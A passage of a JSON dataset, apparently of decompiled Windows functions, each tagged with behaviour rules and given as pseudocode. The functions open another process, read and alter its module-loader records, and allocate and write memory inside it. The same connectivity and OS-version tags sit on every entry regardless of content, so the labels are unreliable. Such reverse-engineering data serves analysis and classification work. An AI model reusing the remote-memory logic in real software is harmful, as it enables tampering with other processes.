  uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_21h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c458f0;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xfffffe08;\n    var_28h = 0;\n    var_1ch = 0;\n    if (var_ch == NULL) {\n        var_2ch = 0x21590066;\n        goto code_r0x00058cbc;\n    }\n    if (var_10h == NULL) {\n        var_2ch = 0x21590067;\n        goto code_r0x00058cbc;\n    }\n    *var_10h = 0;\n    var_2ch = fcn.0005a2c0(&var_28h, 0x438, var_8h);\n    if ((var_2ch == 0) && (var_2ch = fcn.0005a030(var_28h, &var_21h),  var_2ch == 0)) {\n        var_21h._0_1_ = '\\x01' - (var_21h != '\\0');\n        var_2ch = fcn.00059c20(var_28h, &var_30h);\n        if (var_2ch == 0) {\n            var_4h = 0;\n            if (var_21h == '\\0') {\n                var_19ch = 0;\n                if ((var_ch[1] == 0) && (var_ch[5] == 0)) {\n                    var_2ch = fcn.0005a130(var_28h, var_30h, 0, &var_198h, 0x10);\n                    if (var_2ch == 0) {\n                        if (var_18ch == 0) {\n                            var_2ch = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            fcn.00078790(&var_188h, 0, 0x68);\n                            var_170h = *var_ch;\n                            var_168h = var_ch[2];\n                            var_144h = var_ch[3];\n                            var_154h = 0x1004;\n                            var_16ch = var_ch[4];\n                            var_150h._0_2_ = 1;\n                            var_1cch = var_ch + 6;\n                            do {\n                                iVar1 = *var_1cch;\n                                var_1cch = var_1cch + 2;\n                            } while (iVar1 != 0);\n                            var_1d8h._0_2_ = var_1cch - (var_ch + 0x1a) >> 1;\n                            var_15ch._0_2_ = var_1d8h << 1;\n                            if (var_15ch < 2) {\n                                var_15ch._0_2_ = 2;\n                                *(var_ch + 6) = 0;\n                            }\n                            var_15ch._2_2_ = var_15ch + 2;\n                            var_1dch = var_ch + 0x88;\n                            do {\n                                iVar1 = *var_1dch;\n                                var_1dch = var_1dch + 2;\n                            } while (iVar1 != 0);\n                            var_1e8h._0_2_ = var_1dch - (var_ch + 0x222) >> 1;\n                            var_164h._0_2_ = var_1e8h << 1;\n                            if (var_164h < 2) {\n                                var_164h._0_2_ = 2;\n                                *(var_ch + 6) = 0;\n                            }\n                            var_164h._2_2_ = var_164h + 2;\n                            var_19ch = 0;\n                            unique0x00002400 = var_15ch._2_2_ + 0x68 + var_164h._2_2_;\n                            var_2ch = fcn.0007873c(var_28h, &var_19ch, 0, &var_21h + 1, 0x3000, 4);\n                            if (var_2ch == 0) {\n                                var_1ch = var_19ch;\n                                var_158h = var_19ch + 0x68;\n                                var_2ch = fcn.0005a170(var_28h, var_158h, 0, var_ch + 6, var_15ch._2_2_);\n                                if (var_2ch == 0) {\n                                    var_160h = var_19ch + 0x68 + var_15ch._2_2_;\n                                    var_2ch = fcn.0005a170(var_28h, var_160h, 0, var_ch + 0x88, var_164h._2_2_);\n                                    if (var_2ch == 0) {\n                                        var_138h = var_19ch + 0x50;\n                                        var_134h = var_19ch + 0x50;\n                                        var_130h = var_19ch + 0x58;\n                                        var_12ch = var_19ch + 0x58;\n                                        var_128h = var_19ch + 0x60;\n                                        var_124h = var_19ch + 0x60;\n                                        var_2ch = fcn.0005a170(var_28h, var_19ch, 0, &var_188h, 0x68);\n                                        if (var_2ch == 0) {\n                                            fcn.00057a70(var_28h, var_18ch + 0xc, var_19ch);\n                                            fcn.00057a70(var_28h, var_18ch + 0x14, var_19ch + 8);\n                                            *var_10h = var_19ch;\n                                            goto code_r0x00058c5a;\n                                        }\n                                        var_4h = 0xffffffff;\n                                    }\n                                    else {\n                                        var_4h = 0xffffffff;\n                                    }\n                                }\n                                else {\n                                    var_4h = 0xffffffff;\n                                }\n                            }\n                            else {\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_11ch = 0;\n                var_2ch = fcn.0005a130(var_28h, var_30h, 0, &var_118h, 0x20);\n                if (var_2ch == 0) {\n                    var_120h = var_100h;\n                    if (var_100h == 0) {\n                        var_2ch = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        fcn.00078790(&var_f8h, 0, 200);\n                        var_c8h = *var_ch;\n                        var_c4h = var_ch[1];\n                        var_b8h = var_ch[2];\n                        var_78h = var_ch[3];\n                        var_90h = 0x1004;\n                        var_c0h = var_ch[4];\n                        var_bch = var_ch[5];\n                        var_8ch._0_2_ = 1;\n                        var_1a4h = var_ch + 6;\n                        do {\n                            iVar1 = *var_1a4h;\n                            var_1a4h = var_1a4h + 2;\n                        } while (iVar1 != 0);\n                        var_1b0h._0_2_ = var_1a4h - (var_ch + 0x1a) >> 1;\n                        var_a0h._0_2_ = var_1b0h << 1;\n                        if (var_a0h < 2) {\n                            var_a0h._0_2_ = 2;\n                            *(var_ch + 6) = 0;\n                        }\n                        var_a0h._2_2_ = var_a0h + 2;\n                        var_1b4h = var_ch + 0x88;\n                        do {\n                            iVar1 = *var_1b4h;\n                            var_1b4h = var_1b4h + 2;\n                        } while (iVar1 != 0);\n                        var_1c0h._0_2_ = var_1b4h - (var_ch + 0x222) >> 1;\n                        var_b0h._0_2_ = var_1c0h << 1;\n                        if (var_b0h < 2) {\n                            var_b0h._0_2_ = 2;\n                            *(var_ch + 6) = 0;\n                        }\n                        var_b0h._2_2_ = var_b0h + 2;\n                        var_11ch = 0;\n                        unique0x00002880 = var_a0h._2_2_ + 200 + var_b0h._2_2_;\n                        var_2ch = fcn.0007873c(var_28h, &var_11ch, 0, &var_21h + 1, 0x3000, 4);\n                        if (var_2ch == 0) {\n                            var_1ch = var_11ch;\n                            var_98h = var_11ch + 200;\n                            var_94h = 0;\n                            var_2ch = fcn.0005a170(var_28h, var_98h, 0, var_ch + 6, var_a0h._2_2_);\n                            if (var_2ch == 0) {\n                                var_a8h = var_11ch + 200 + var_a0h._2_2_;\n                                var_a4h = 0;\n                                var_2ch = fcn.0005a170(var_28h, var_a8h, 0, var_ch + 0x88, var_b0h._2_2_);\n                                if (var_2ch == 0) {\n                                    var_60h = var_11ch + 0x98;\n                                    var_5ch = 0;\n                                    var_58h = var_11ch + 0x98;\n                                    var_54h = 0;\n                                    var_50h = var_11ch + 0xa8;\n                                    var_4ch = 0;\n                                    var_48h = var_11ch + 0xa8;\n                                    var_44h = 0;\n                                    var_40h = var_11ch + 0xb8;\n                                    var_3ch = 0;\n                                    var_38h = var_11ch + 0xb8;\n                                    var_34h = 0;\n                                    var_2ch = fcn.0005a170(var_28h, var_11ch, 0, &var_f8h, 200);\n                                    if (var_2ch == 0) {\n                                        fcn.00057930(var_28h, var_120h + 0x10, var_11ch);\n                                        fcn.00057930(var_28h, var_120h + 0x20, var_11ch + 0x10);\n                                        *var_10h = var_11ch;\ncode_r0x00058c5a:\n                                        var_2ch = 0;\n                                        var_4h = 0xffffffff;\n                                    }\n                                    else {\n                                        var_4h = 0xffffffff;\n                                    }\n                                }\n                                else {\n                                    var_4h = 0xffffffff;\n                                }\n                            }\n                            else {\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\n    if ((var_2ch != 0) && (var_1ch != 0)) {\n        stack0xffffffdc = 0;\n        fcn.00078730(var_28h, &var_1ch, &var_21h + 1, 0x8000);\n    }\n    if (var_28h != 0) {\n        fcn.00078544(var_28h);\n    }\ncode_r0x00058cbc:\n    *in_FS_OFFSET = var_10h_2;\n    return var_2ch;\n}\n",
        "token_count": 3501
    },
    "00058cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00058cd0(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    uint *var_ch;\n    uint var_158h;\n    uint32_t var_124h;\n    uint var_f0h;\n    uint32_t var_88h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45850;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    *0x10 = &stack0xfffffe98;\n    var_20h = 0;\n    if (var_ch == NULL) {\n        var_24h = 0x21590066;\n        goto code_r0x00058ead;\n    }\n    var_24h = fcn.0005a2c0(&var_20h, 0x438, var_8h);\n    if ((var_24h == 0) && (var_24h = fcn.0005a030(var_20h, &var_19h),  var_24h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_4h = 0;\n        if (var_19h == '\\0') {\n            var_24h = fcn.0005a130(var_20h, *var_ch, 0, &var_158h, 0x68);\n            if (var_24h == 0) {\n                var_124h = var_124h & 0xffffefff | 0xc4000;\n                var_24h = fcn.0005a170(var_20h, *var_ch, 0, &var_158h, 0x68);\n                if (var_24h == 0) goto code_r0x00058e74;\n                var_4h = 0xffffffff;\n            }\n            else {\n                var_4h = 0xffffffff;\n            }\n        }\n        else {\n            var_24h = fcn.0005a130(var_20h, *var_ch, 0, &var_f0h, 200);\n            if (var_24h == 0) {\n                var_88h = var_88h & 0xffffefff | 0xc4000;\n                var_24h = fcn.0005a170(var_20h, *var_ch, 0, &var_f0h, 200);\n                if (var_24h == 0) {\ncode_r0x00058e74:\n                    var_24h = 0;\n                    var_4h = 0xffffffff;\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_4h = 0xffffffff;\n            }\n        }\n    }\n    if (var_20h != 0) {\n        fcn.00078544(var_20h);\n    }\ncode_r0x00058ead:\n    *in_FS_OFFSET = var_10h;\n    return var_24h;\n}\n",
        "token_count": 778
    },
    "00058ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00058ec0(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    uint var_18h;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45930;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xffffffc8;\n    if (var_ch == 0) {\n        var_28h = 0x21590066;\n    }\n    else {\n        var_28h = fcn.00057b40(var_8h, var_ch, &var_20h);\n        if ((var_28h == 0) && (var_28h = fcn.0005a2c0(&var_24h, 0x18, var_8h),  var_28h == 0)) {\n            var_4h = 0;\n            var_1ch = 0;\n            fcn.00078730(var_24h, &var_20h, &var_1ch, 0x8000);\n            fcn.00078544(var_24h);\n            var_28h = 0;\n        }\n    }\n    *in_FS_OFFSET = var_10h;\n    return var_28h;\n}\n",
        "token_count": 388
    },
    "00058fa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00058fa0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00035200(0x20a);\n    if (arg_ch_00 == 0) {\n        var_4h = 0x21590004;\n    }\n    else {\n        iVar1 = fcn.0007871e(arg_ch_00, arg_ch, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590004;\n        }\n        else {\n            *(arg_ch_00 + 0x104) = 0;\n            var_4h = fcn.00059020(arg_8h, arg_ch_00, arg_10h);\n        }\n        fcn.00035330(arg_ch_00);\n    }\n    return var_4h;\n}\n",
        "token_count": 231
    },
    "00059020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00059020(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        uVar2 = fcn.00078718(arg_ch, 0x5c);\n        if (uVar2 == 0) {\n            uVar2 = fcn.00078718(arg_ch, 0x2f);\n        }\n        uVar1 = fcn.00059090(arg_8h, arg_ch, uVar2 & 0xffffff00 | uVar2 != 0, 0, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 206
    },
    "00059090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00059090(uint param_1, int16_t *param_2, char param_3, char param_4, int32_t *param_5)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int16_t *var_ch;\n    uint var_10h;\n    uint var_14h;\n    int32_t *var_18h_2;\n    uint32_t var_24ch;\n    uint32_t var_248h;\n    uint var_244h;\n    uint var_23ch;\n    int16_t *var_238h;\n    uint var_234h;\n    int32_t var_230h;\n    uint var_22ch;\n    uint *var_228h;\n    uint var_224h;\n    int32_t var_210h;\n    uint var_200h;\n    int32_t var_1f4h;\n    uint var_1f0h;\n    int32_t var_1d8h;\n    uint var_1cch;\n    uint var_1c4h;\n    int32_t var_188h;\n    int32_t var_180h;\n    int32_t var_17ch;\n    int32_t var_178h;\n    uint *var_174h;\n    uint var_170h;\n    int32_t var_150h;\n    uint var_130h;\n    int32_t var_118h;\n    uint var_110h;\n    int32_t var_e0h;\n    uint var_c8h;\n    uint var_b8h;\n    int32_t var_48h;\n    uint32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    char var_1eh;\n    char var_1dh;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c458e0;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xfffffda4;\n    var_1ch = 0;\n    var_238h = var_ch;\n    do {\n        iVar1 = *var_238h;\n        var_238h = var_238h + 1;\n    } while (iVar1 != 0);\n    var_38h = (var_238h - (var_ch + 1) >> 1) << 1;\n    var_28h = 0;\n    if (var_ch == NULL) {\n        var_30h = 0x21590066;\n        goto code_r0x0005976b;\n    }\n    if (var_18h_2 == NULL) {\n        var_30h = 0x21590069;\n        goto code_r0x0005976b;\n    }\n    *var_18h_2 = 0;\n    var_1ch = fcn.00035200(0x20a);\n    if (var_1ch == 0) {\n        var_30h = 0x21590004;\n        goto code_r0x0005976b;\n    }\n    var_30h = fcn.0005a2c0(&var_28h, 0x438, var_8h);\n    if ((var_30h == 0) && (var_30h = fcn.0005a030(var_28h, &var_1dh),  var_30h == 0)) {\n        var_1dh = '\\x01' - (var_1dh != '\\0');\n        var_30h = fcn.00059fe0(var_28h, &var_1eh);\n        if (var_30h == 0) {\n            if (var_14h == '\\0') {\n                var_30h = fcn.00059c20(var_28h, &var_34h);\n            }\n            else {\n                var_30h = fcn.00059c60(var_28h, &var_34h);\n            }\n            if (var_30h == 0) {\n                var_4h = 0;\n                if ((var_1dh == '\\0') && ((var_1eh == '\\0' || (var_14h == '\\0')))) {\n                    var_30h = fcn.0005a130(var_28h, var_34h, 0, &var_200h, 0x10);\n                    if (var_30h == 0) {\n                        if (var_1f4h == 0) {\n                            var_30h = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_30h = fcn.0005a130(var_28h, var_1f4h, 0, &var_224h, 0x24);\n                            if (var_30h == 0) {\n                                if (var_10h == '\\0') {\n                                    var_228h = &var_1c4h;\n                                }\n                                else {\n                                    var_228h = &var_1cch;\n                                }\n                                var_230h = var_210h;\n                                while (var_230h != var_1f4h + 0x14) {\n                                    var_30h = fcn.0005a130(var_28h, var_230h, 0, &var_188h, 8);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x0005974d;\n                                    }\n                                    var_30h = fcn.0005a130(var_28h, var_230h + -8, 0, &var_1f0h, 0x48);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x0005974d;\n                                    }\n                                    if (var_38h == *var_228h) {\n                                        if (*var_228h >> 1 < 0x104) {\n                                            var_24ch = *var_228h >> 1;\n                                        }\n                                        else {\n                                            var_24ch = 0x104;\n                                        }\n                                        var_24h = var_24ch;\n                                        iVar2 = fcn.0005a130(var_28h, var_228h[1], 0, var_1ch, var_24ch << 1);\n                                        if (iVar2 == 0) {\n                                            *(var_1ch + var_24h * 2) = 0;\n                                            iVar2 = fcn.00078538(var_1ch, var_ch, var_24h);\n                                            if (iVar2 == 0) {\n                                                var_30h = fcn.0005a130(var_28h, var_230h + 0x30, 0, &var_2ch, 2);\n                                                if (var_30h != 0) {\n                                                    var_4h = 0xffffffff;\n                                                    goto code_r0x0005974d;\n                                                }\n                                                if (var_2ch != -1) {\n                                                    var_2ch._0_2_ = var_2ch + 1;\n                                                    var_30h = fcn.0005a170(var_28h, var_230h + 0x30, 0, &var_2ch, 2);\n                                                    if (var_30h != 0) {\n                                                        var_4h = 0xffffffff;\n                                                        goto code_r0x0005974d;\n                                                    }\n                                                }\n                                                *var_18h_2 = var_1d8h;\n                                                break;\n                                            }\n                                        }\n                                    }\n                                    var_230h = var_188h;\n                                }\ncode_r0x00059715:\n                                var_30h = (-(*var_18h_2 != 0) & 0xdea6fffb) + 0x21590005;\n                                var_4h = 0xffffffff;\n                            }\n                            else {\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_30h = fcn.0005a130(var_28h, var_34h, 0, &var_130h, 0x20);\n                    if (var_30h == 0) {\n                        var_180h = var_118h;\n                        if (var_118h == 0) {\n                            var_30h = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_30h = fcn.0005a130(var_28h, var_118h, 0, &var_170h, 0x40);\n                            if (var_30h == 0) {\n                                if (var_10h == '\\0') {\n                                    var_174h = &var_b8h;\n                                }\n                                else {\n                                    var_174h = &var_c8h;\n                                }\n                                var_17ch = var_150h;\n                                while (var_17ch != var_180h + 0x20) {\n                                    var_30h = fcn.0005a130(var_28h, var_17ch, 0, &var_48h, 0x10);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x0005974d;\n                                    }\n                                    var_178h = var_17ch + -0x10;\n                                    var_30h = fcn.0005a130(var_28h, var_178h, 0, &var_110h, 0x88);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x0005974d;\n                                    }\n                                    if (var_38h == *var_174h) {\n                                        if (*var_174h >> 1 < 0x104) {\n                                            var_248h = *var_174h >> 1;\n                                        }\n                                        else {\n                                            var_248h = 0x104;\n                                        }\n                                        var_24h = var_248h;\n                                        iVar2 = fcn.0005a130(var_28h, var_174h[2], var_174h[3], var_1ch, var_248h << 1);\n                                        if (iVar2 == 0) {\n                                            *(var_1ch + var_24h * 2) = 0;\n                                            iVar2 = fcn.00078538(var_1ch, var_ch, var_24h);\n                                            if (iVar2 == 0) {\n                                                var_30h = fcn.0005a130(var_28h, var_178h + 0x6c, 0, &var_2ch, 2);\n                                                if (var_30h != 0) {\n                                                    var_4h = 0xffffffff;\n                                                    goto code_r0x0005974d;\n                                                }\n                                                if (var_2ch != -1) {\n                                                    var_2ch._0_2_ = var_2ch + 1;\n                                                    var_30h = fcn.0005a170(var_28h, var_178h + 0x6c, 0, &var_2ch, 2);\n                                                    if (var_30h != 0) {\n                                                        var_4h = 0xffffffff;\n                                                        goto code_r0x0005974d;\n                                                    }\n                                                }\n                                                *var_18h_2 = var_e0h;\n                                                break;\n                                            }\n                                        }\n                                    }\n                                    var_17ch = var_48h;\n                                }\n                                goto code_r0x00059715;\n                            }\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0005974d:\n    if (var_28h != 0) {\n        fcn.00078544(var_28h);\n    }\n    fcn.00035330(var_1ch);\ncode_r0x0005976b:\n    *in_FS_OFFSET = var_10h_2;\n    return var_30h;\n}\n",
        "token_count": 2815
    },
    "00059780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00059780(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    uint var_228h;\n    int32_t var_224h;\n    uint var_220h;\n    uint var_21ch;\n    int32_t var_208h;\n    uint var_1f8h;\n    int32_t var_1ech;\n    uint var_1e8h;\n    int32_t var_1d0h;\n    int32_t var_17ch;\n    int32_t var_174h;\n    int32_t var_170h;\n    int32_t var_16ch;\n    uint var_168h;\n    int32_t var_148h;\n    uint var_128h;\n    int32_t var_110h;\n    uint var_108h;\n    int32_t var_d8h;\n    int32_t var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c458d0;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    *0x10 = &stack0xfffffdc8;\n    var_20h = 0;\n    if (var_ch == 0) {\n        var_28h = 0x21590066;\n        goto code_r0x00059c0c;\n    }\n    var_28h = fcn.0005a2c0(&var_20h, 0x438, var_8h);\n    if ((var_28h == 0) && (var_28h = fcn.0005a030(var_20h, &var_19h),  var_28h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_28h = fcn.00059c20(var_20h, &var_2ch);\n        if (var_28h == 0) {\n            var_4h = 0;\n            if (var_19h == '\\0') {\n                var_28h = fcn.0005a130(var_20h, var_2ch, 0, &var_1f8h, 0x10);\n                if (var_28h == 0) {\n                    if (var_1ech == 0) {\n                        var_28h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_28h = fcn.0005a130(var_20h, var_1ech, 0, &var_21ch, 0x24);\n                        if (var_28h == 0) {\n                            var_224h = var_208h;\n                            while (var_224h != var_1ech + 0x14) {\n                                var_28h = fcn.0005a130(var_20h, var_224h, 0, &var_17ch, 8);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00059bfa;\n                                }\n                                var_28h = fcn.0005a130(var_20h, var_224h + -8, 0, &var_1e8h, 0x48);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00059bfa;\n                                }\n                                if (var_1d0h == var_ch) {\n                                    var_28h = fcn.0005a130(var_20h, var_224h + 0x30, 0, &var_24h, 2);\n                                    if (var_28h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x00059bfa;\n                                    }\n                                    if ((var_24h != 0) && (var_24h != -1)) {\n                                        var_24h._0_2_ = var_24h + -1;\n                                        var_28h = fcn.0005a170(var_20h, var_224h + 0x30, 0, &var_24h, 2);\n                                        if (var_28h != 0) {\n                                            var_4h = 0xffffffff;\n                                            goto code_r0x00059bfa;\n                                        }\n                                    }\n                                    var_28h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00059bfa;\n                                }\n                                var_224h = var_17ch;\n                            }\n                            goto code_r0x00059bd3;\n                        }\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_28h = fcn.0005a130(var_20h, var_2ch, 0, &var_128h, 0x20);\n                if (var_28h == 0) {\n                    var_174h = var_110h;\n                    if (var_110h == 0) {\n                        var_28h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_28h = fcn.0005a130(var_20h, var_110h, 0, &var_168h, 0x40);\n                        if (var_28h == 0) {\n                            var_170h = var_148h;\n                            while (var_170h != var_174h + 0x20) {\n                                var_28h = fcn.0005a130(var_20h, var_170h, 0, &var_40h, 0x10);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00059bfa;\n                                }\n                                var_16ch = var_170h + -0x10;\n                                var_28h = fcn.0005a130(var_20h, var_16ch, 0, &var_108h, 0x88);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00059bfa;\n                                }\n                                if (var_d8h == var_ch) {\n                                    var_28h = fcn.0005a130(var_20h, var_16ch + 0x6c, 0, &var_24h, 2);\n                                    if (var_28h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x00059bfa;\n                                    }\n                                    if ((var_24h != 0) && (var_24h != -1)) {\n                                        var_24h._0_2_ = var_24h + -1;\n                                        var_28h = fcn.0005a170(var_20h, var_16ch + 0x6c, 0, &var_24h, 2);\n                                        if (var_28h != 0) {\n                                            var_4h = 0xffffffff;\n                                            goto code_r0x00059bfa;\n                                        }\n                                    }\n                                    var_28h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00059bfa;\n                                }\n                                var_170h = var_40h;\n                            }\ncode_r0x00059bd3:\n                            var_28h = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x00059bfa:\n    if (var_20h != 0) {\n        fcn.00078544(var_20h);\n    }\ncode_r0x00059c0c:\n    *in_FS_OFFSET = var_10h;\n    return var_28h;\n}\n",
        "token_count": 1910
    },
    "00059c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00059c20(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.00059fe0(arg_8h, &var_1h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00059c80(arg_8h, var_1h == '\\0', arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 139
    },
    "00059c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
